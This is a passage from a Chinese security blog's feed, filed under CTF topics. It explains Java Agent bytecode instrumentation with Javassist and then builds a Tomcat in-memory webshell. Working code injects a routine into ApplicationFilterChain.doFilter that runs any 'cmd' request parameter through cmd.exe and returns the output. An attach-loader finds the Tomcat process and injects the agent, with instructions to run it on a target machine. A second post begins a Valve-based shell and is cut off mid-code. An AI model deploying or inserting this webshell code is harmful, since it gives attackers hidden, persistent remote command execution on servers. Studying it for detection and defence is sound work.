class="name">phase</span>&gt;</span>package<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">goals</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">goal</span>&gt;</span>single<span class="tag">&lt;/<span class="name">goal</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">goals</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">execution</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">executions</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br></pre></td></tr></table></figure><p>依赖主要是修改字节码的包，比如<code>javassist</code>、<code>asm</code></p><h3 id="通过premain-方法修改字节码"><a href="#通过premain-方法修改字节码" class="headerlink" title="通过premain()方法修改字节码"></a>通过<code>premain()</code>方法修改字节码</h3><p>构建一个正常的<code>app.jar</code>程序，其主要功能是每隔一秒输出一句<code>&quot;hello world&quot;</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在我们定义的<code>Agent</code>类中，定义<code>premain()</code>方法，我们要用到<code>Instrumentation</code>的一些方法调用已加载的类并进行修改，常用的方法</p><table><thead><tr><th align="left">方法</th><th align="left">功能描述</th></tr></thead><tbody><tr><td align="left"><strong><code>getAllLoadedClasses()</code></strong></td><td align="left">获取 JVM 中所有已加载的类数组，可筛选关心的类</td></tr><tr><td align="left"><strong><code>redefineClasses(ClassDefinition... definitions)</code></strong></td><td align="left">使用类定义重新定义指定的类</td></tr><tr><td align="left"><strong><code>retransformClasses(Class&lt;?&gt;... classes)</code></strong></td><td align="left">使用已注册的 transformers 修改指定的类</td></tr><tr><td align="left"><strong><code>addTransformer(ClassFileTransformer transformer)</code></strong></td><td align="left">注册类文件转换器</td></tr><tr><td align="left"><strong><code>removeTransformer(ClassFileTransformer transformer)</code></strong></td><td align="left">注销类文件转换器</td></tr></tbody></table><p>比如这里，我们尝试让先前app.jar不再打印<code>&quot;hello world&quot;</code>而是<code>&quot;hello Sekai&quot;</code>，先获取<code>Main</code>类再尝试修改</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">premain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">CustomTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; clazz : classes) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getName().startsWith(<span class="string">&quot;Main&quot;</span>)) &#123;</span><br><span class="line">                inst.retransformClasses(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们需要注册一个转换器去执行对类字节码的修改操作，该类需要实现<code>ClassFileTransformer</code>接口，重写<code>transform()</code>方法，我们在<code>transform()</code>方法中使用Javassist操作</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CustomTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">            <span class="keyword">if</span> (className == <span class="literal">null</span> || !className.equals(<span class="string">&quot;Main&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            <span class="type">byte</span>[] transformedBytes;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer));</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">method</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;main&quot;</span>);</span><br><span class="line">                method.setBody(<span class="string">&quot;&#123; System.out.println(\&quot;Hello Sekai\&quot;); &#125;&quot;</span>);</span><br><span class="line">                transformedBytes = ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> transformedBytes;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>将该项目打包为jar，使用不同的方式启动程序则会打印不同的内容</p><p><img src="/img/post/image-20260115200722448.png" alt="image-20260115200722448"></p><h3 id="通过agentmain-方法修改字节码"><a href="#通过agentmain-方法修改字节码" class="headerlink" title="通过agentmain()方法修改字节码"></a>通过<code>agentmain()</code>方法修改字节码</h3><p><del>为了便于表现效果，我们修改app.jar的逻辑让它循环打印”hello world”</del></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Hello world&quot;</span>);</span><br><span class="line">            Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好的，等我写到这句话的时候，现实世界已经过去快8个小时了，由于我一直尝试直接篡改<code>main()</code>方法的循环，但是实际上即使类被重新定义也是不会立即生效的，而是等到其安全退出，我犯了一个极其愚蠢的错误。接下来，我将使用循环套用另一个类的静态方法来达到相同的效果，并且这样也更符合实际情况</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>)&#123;</span><br><span class="line">            SayHello.doHello();</span><br><span class="line">            Thread.sleep(<span class="number">1000L</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>SayHello</code>类的定义</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SayHello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">doHello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello world!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来就是定义<code>agentmain()</code>方法了，其实大体上可以和<code>premain()</code>差不多</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">        <span class="type">CustomTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomTransformer</span>();</span><br><span class="line">        inst.addTransformer(transformer, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; clazz : classes) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;SayHello&quot;</span>)) &#123;</span><br><span class="line">                inst.retransformClasses(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>接下来是<code>CustomTransformer</code>类的构造，此处应该要把<code>loader</code>放进<code>pool</code>中，不然java会连一些很基础的类都找不到</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CustomTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                            Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                            <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!className.equals(<span class="string">&quot;SayHello&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">            pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">            <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer));</span><br><span class="line">            <span class="type">CtMethod</span> <span class="variable">target</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doHello&quot;</span>);</span><br><span class="line">            target.setBody(<span class="string">&quot;&#123; System.out.println(\&quot;Hello Sekai!\&quot;); &#125;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于源代码里面我把<code>SayHello</code>类放在了根目录，如果是有包名的话，由于<code>className</code>默认以<code>/</code>作为分隔符，后面对类名进行筛选的时候可以直接用<code>/</code>分隔，或者为了通用一些对<code>className</code>处理一下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">dotted</span> <span class="operator">=</span> className.replace(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br></pre></td></tr></table></figure><p>将项目导出为jar包，在主程序运行时可以通过一个程序运行，<code>valueOf()</code>方法内的参数为主程序运行的PID</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Attach</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> AgentLoadException, IOException, AgentInitializationException, AttachNotSupportedException &#123;</span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(String.valueOf(<span class="number">26424</span>));</span><br><span class="line">        vm.loadAgent(<span class="string">&quot;C:\\Users\\leyi\\IntelliJTest\\JavaAgentTest\\target\\JavaAgentTest-1.0-SNAPSHOT-jar-with-dependencies.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>或者直接通过jcmd命令行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">jcmd 808 JVMTI.agent_load C:\Users\leyi\IntelliJTest\JavaAgentTest\target\JavaAgentTest-1.0-SNAPSHOT-jar-with-dependencies.jar</span><br></pre></td></tr></table></figure><p>效果如下，这里只展示主程序的变化，WARNING出现的时候就是agent挂载时机</p><p><img src="/img/post/image-20260116013202851.png" alt="image-20260116013202851"></p><br/><h2 id="Java-Agent的内存马实现"><a href="#Java-Agent的内存马实现" class="headerlink" title="Java Agent的内存马实现"></a>Java Agent的内存马实现</h2><p>通过agent修改运行时的类，为目标类对象添加我们定义的恶意逻辑</p><p><code>ApplicationFilterChain</code>类是Tomcat执行Filter链的核心类，该类的<code>doFilter()</code>方法能够拿到每次请求的<code>ServletRequest</code>和<code>ServletResponse</code>对象，这对实现内存马回显是极好的</p><p>准备的恶意逻辑，插入<code>doFilter()</code>方法前，由于javassist不支持可变参数，这里看了<code>ProcessBuilder</code>类的构造方法需要传入一个列表，这里需要先构造列表，并且javassist不支持泛型，也不用写泛型了</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        ProcessBuilder processBuilder;</span><br><span class="line">        <span class="type">List</span> <span class="variable">command</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ArrayList</span>();</span><br><span class="line">        command.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">        command.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">        command.add(cmd);                </span><br><span class="line">        processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(command);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> processBuilder.start();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=GBK&quot;</span>);</span><br><span class="line">        response.getWriter().println(output);</span><br><span class="line">    &#125;         </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编写<code>agentmain()</code>方法用于实现运行时加载agent，<code>FilterChain</code>类需要使用全限定名</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> <span class="keyword">throws</span> UnmodifiableClassException &#123;</span><br><span class="line">        <span class="type">CustomTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CustomTransformer</span>();</span><br><span class="line">        inst.addTransformer(transformer, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt;[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class&lt;?&gt; clazz : classes) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> clazz.getName();</span><br><span class="line">            <span class="keyword">if</span> (name.equals(<span class="string">&quot;org.apache.catalina.core.ApplicationFilterChain&quot;</span>)) &#123;</span><br><span class="line">                inst.retransformClasses(clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>定义CustomTransformer类，需要导入必要的包，比如<code>List</code>、<code>BufferedReader</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">CustomTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className,</span><br><span class="line">                                Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain,</span><br><span class="line">                                <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (!className.equals(<span class="string">&quot;org/apache/catalina/core/ApplicationFilterChain&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                pool.importPackage(<span class="string">&quot;java.util&quot;</span>);</span><br><span class="line">                pool.importPackage(<span class="string">&quot;java.io&quot;</span>);</span><br><span class="line">                pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">LoaderClassPath</span>(loader));</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(classfileBuffer));</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">target</span> <span class="operator">=</span> ctClass.getDeclaredMethod(<span class="string">&quot;doFilter&quot;</span>);</span><br><span class="line">                target.insertBefore(<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            String cmd = request.getParameter(\&quot;cmd\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            if (cmd != null) &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                StringBuilder output = new StringBuilder();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                ProcessBuilder processBuilder;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                List command =  new ArrayList();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                command.add(\&quot;cmd.exe\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                command.add(\&quot;/c\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                command.add(cmd);&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                processBuilder = new ProcessBuilder(command);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                try &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    Process process = processBuilder.start();\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    String line;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    while ((line = reader.readLine()) != null) &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                        output.append(line).append(\&quot;\\n\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                &#125; catch (IOException e) &#123;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                    throw new RuntimeException(e);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                &#125;\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                response.setContentType(\&quot;text/html;charset=GBK\&quot;);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;                response.getWriter().println(output);\n&quot;</span> +</span><br><span class="line">                        <span class="string">&quot;            &#125; &quot;</span> +</span><br><span class="line">                        <span class="string">&quot;        &#125;&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> ctClass.toBytecode();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>此外，想要动态加载agent，需要知道当前服务器运行的PID，前面由于在本机上我直接通过jps命令即可获取，在攻击角度上，则需要这个jar包在运行时自动查找服务器运行的PID并执行加载agent命令</p><p>为jar包定义一个入口类，执行时自动运行该方法，该方法用于获取服务器进程PID和加载agent</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Boot</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pid</span> <span class="operator">=</span> getPID(<span class="string">&quot;org.apache.catalina.startup.Bootstrap&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">jar</span> <span class="operator">=</span> getJar(Boot.class);</span><br><span class="line">        <span class="type">VirtualMachine</span> <span class="variable">vm</span> <span class="operator">=</span> VirtualMachine.attach(pid);</span><br><span class="line">        vm.loadAgent(jar);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getJar</span><span class="params">(Class&lt;?&gt; clazz)</span>&#123;</span><br><span class="line">        <span class="type">ProtectionDomain</span> <span class="variable">domain</span> <span class="operator">=</span> clazz.getProtectionDomain();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">location</span> <span class="operator">=</span> domain.getCodeSource().getLocation();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> location.getPath();</span><br><span class="line">        <span class="keyword">if</span>(System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;win&quot;</span>)&amp;&amp;path.startsWith(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">            path =  path.substring(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getPID</span><span class="params">(String className)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;jps -l&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (line.contains(className)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> line.split(<span class="string">&quot; &quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要在MF文件中配置入口类</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Main-Class: Boot</span><br><span class="line">Agent-Class: Agent</span><br><span class="line">Can-Redefine-Classes: true</span><br><span class="line">Can-Retransform-Classes: true</span><br><span class="line">Can-Set-Native-Method-Prefix: true</span><br></pre></td></tr></table></figure><p>该方法在目标机器上寻找<code>org.apache.catalina.startup.Bootstrap</code>进程号，并识别自己的路径，之后通过PID获取<code>VirtualMachine</code>对象，将自己的路径也就是agent路径载入服务器进程</p><p>将程序打包，在目标机器上执行以下代码，即可通过篡改内存中<code>ApplicationFilterChain</code>的字节码实现内存马的效果</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -jar path/to/agent.jar</span><br></pre></td></tr></table></figure><p>效果如下</p><p><img src="/img/post/image-20260116215731267.png" alt="image-20260116215731267"></p>]]></content>
      
      
      <categories>
          
          <category> CTF相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat Valve内存马</title>
      <link href="/2026/01/15/Tomcat%20Valve%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2026/01/15/Tomcat%20Valve%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat-Valve内存马"><a href="#Tomcat-Valve内存马" class="headerlink" title="Tomcat Valve内存马"></a>Tomcat Valve内存马</h1><p>Valve是Tomcat 容器的专用请求处理拦截器，能够对流量进行一定操控</p><br/><h2 id="关于Valve"><a href="#关于Valve" class="headerlink" title="关于Valve"></a>关于Valve</h2><p>在Tomcat服务器中，流量会经转多个容器，容器内具有一条管道<code>Pipeline</code>供流量传输，在该管道中，可以设置阀门<code>Valve</code>对流量进行处理，类似于JavaEE中的过滤器Filter，Valve通过<code>invoke()</code>方法对流量进行相应操作</p><p><img src="/img/post/IMyaJTVZlbgmWEc.jpg" alt="IMyaJTVZlbgmWEc"></p><p><code>Pipeline</code>接口中，具有一个<code>addValve()</code>方法用于添加自定义阀</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Pipeline</span> <span class="keyword">extends</span> <span class="title class_">Contained</span> &#123;</span><br><span class="line">    Valve <span class="title function_">getBasic</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">setBasic</span><span class="params">(Valve var1)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">addValve</span><span class="params">(Valve var1)</span>;</span><br><span class="line"></span><br><span class="line">    Valve[] getValves();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">removeValve</span><span class="params">(Valve var1)</span>;</span><br><span class="line"></span><br><span class="line">    Valve <span class="title function_">getFirst</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAsyncSupported</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">findNonAsyncValves</span><span class="params">(Set&lt;String&gt; var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因而只需要获取一个容器，向容器中添加我们定义的恶意Valve类就可以执行我们的恶意逻辑，Context容器当然是首选，在前面<code>FIlter</code>、<code>Servlet</code>内存马的构建中我们可以轻松地获取Context容器接口的实现类<code>StandardContext</code></p><br/><h2 id="构建Valve内存马"><a href="#构建Valve内存马" class="headerlink" title="构建Valve内存马"></a>构建Valve内存马</h2><p>继承<code>ValveBase</code>类构建恶意的Valve，重写<code>invoke()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">ValveShell</span> <span class="keyword">extends</span> <span class="title class_">ValveBase</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                ProcessBuilder processBuilder;</span><br><span class="line">                processBuilder = <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;cmd.exe&quot;</span>, <span 